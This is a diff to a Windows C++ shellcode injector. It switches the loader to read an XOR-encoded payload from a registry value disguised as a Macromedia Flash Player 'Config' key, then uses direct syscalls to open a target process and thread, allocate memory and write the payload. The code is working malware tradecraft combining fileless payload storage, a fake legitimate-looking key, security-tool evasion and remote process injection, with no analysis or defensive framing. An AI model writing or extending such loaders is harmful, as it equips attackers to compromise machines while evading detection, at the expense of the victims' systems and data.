@@ -1,10 +1,14 @@
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <iostream>
+#include <winreg.h>
 #include "syscalls.h"
-#include "payload.h"
 
-typedef NTSTATUS(NTAPI* pNtXxx)();
+#pragma comment(lib, "Advapi32.lib")
+
+#define REG_KEY   "Software\\Macromedia\\FlashPlayer"
+#define REG_VALUE "Config"
+#define XOR_KEY   0xAA
 
 DWORD FindThreadInProcess(DWORD pid) {
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
@@ -28,6 +32,51 @@ DWORD FindThreadInProcess(DWORD pid) {
 	return tid;
 }
 
+// Lit la payload depuis le registre, la XOR-decode en mémoire.
+// Retourne un buffer alloué (à libérer par l'appelant) + sa taille.
+static unsigned char* LoadPayloadFromRegistry(SIZE_T* outSize) {
+	*outSize = 0;
+
+	HKEY hKey = NULL;
+	LSTATUS ls = RegOpenKeyExA(HKEY_CURRENT_USER, REG_KEY, 0, KEY_READ, &hKey);
+	if (ls != ERROR_SUCCESS) {
+		printf("[-] RegOpenKeyExA failed: %ld\n", ls);
+		return NULL;
+	}
+
+	DWORD size = 0;
+	ls = RegQueryValueExA(hKey, REG_VALUE, NULL, NULL, NULL, &size);
+	if (ls != ERROR_SUCCESS || size == 0) {
+		printf("[-] RegQueryValueExA (size) failed: %ld\n", ls);
+		RegCloseKey(hKey);
+		return NULL;
+	}
+
+	unsigned char* buf = (unsigned char*)malloc(size);
+	if (!buf) {
+		RegCloseKey(hKey);
+		return NULL;
+	}
+
+	ls = RegQueryValueExA(hKey, REG_VALUE, NULL, NULL, buf, &size);
+	RegCloseKey(hKey);
+
+	if (ls != ERROR_SUCCESS) {
+		printf("[-] RegQueryValueExA (data) failed: %ld\n", ls);
+		SecureZeroMemory(buf, size);
+		free(buf);
+		return NULL;
+	}
+
+	// XOR decode en place
+	for (DWORD i = 0; i < size; i++) buf[i] ^= XOR_KEY;
+
+	printf("[+] Payload lue depuis HKCU\\%s\\%s (%lu octets)\n", REG_KEY, REG_VALUE, size);
+
+	*outSize = size;
+	return buf;
+}
+
 int main(int argc, char* argv[]) {
 	if (argc < 2) {
 		printf("Usage: %s <PID>\n", argv[0]);
@@ -39,15 +88,15 @@ int main(int argc, char* argv[]) {
 	HANDLE hProcess = NULL;
 	HANDLE hThread = NULL;
 	PVOID rBuffer = NULL;
-	SIZE_T regionSize = payload_size;
 	SIZE_T bytesWritten = 0;
 	ULONG oldProtect = 0;
 	ULONG suspendCount = 0;
 
-	unsigned char* buf = (unsigned char*)malloc(payload_size);
-	if (!buf) return 1;
-	memcpy(buf, payload, payload_size);
-	for (size_t i = 0; i < payload_size; i++) buf[i] ^= payload_key;
+	SIZE_T payload_size = 0;
+	unsigned char* buf = LoadPayloadFromRegistry(&payload_size);
+	if (!buf || payload_size == 0) return 1;
+
+	SIZE_T regionSize = payload_size;
 
 	CLIENT_ID cid = { 0 };
 	cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
@@ -63,6 +112,7 @@ int main(int argc, char* argv[]) {
 
 	if (status != 0 || hProcess == NULL) {
 		printf("[-] NtOpenProcess failed: 0x%08lX\n", status);
+		SecureZeroMemory(buf, payload_size);
 		free(buf);
 		return 1;
 	}
@@ -72,6 +122,7 @@ int main(int argc, char* argv[]) {
 	if (tid == 0) {
 		printf("[-] No thread found in target process\n");
 		Sw3NtClose(hProcess);
+		SecureZeroMemory(buf, payload_size);
 		free(buf);
 		return 1;
 	}
@@ -88,6 +139,7 @@ int main(int argc, char* argv[]) {
 	if (status != 0 || hThread == NULL) {
 		printf("[-] NtOpenThread failed: 0x%08lX\n", status);
 		Sw3NtClose(hProcess);
+		SecureZeroMemory(buf, payload_size);
 		free(buf);
 		return 1;
 	}
@@ -105,6 +157,7 @@ int main(int argc, char* argv[]) {
 		printf("[-] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
 		Sw3NtClose(hThread);
 		Sw3NtClose(hProcess);
+		SecureZeroMemory(buf, payload_size);
 		free(buf);
 		return 1;
 	}
@@ -119,6 +172,7 @@ int main(int argc, char* argv[]) {
 
 	SecureZeroMemory(buf, payload_size);
 	free(buf);
+	buf = NULL;
 
 	if (status != 0) {
 		printf("[-] NtWriteVirtualMemory failed: 0x%08lX\n", status);
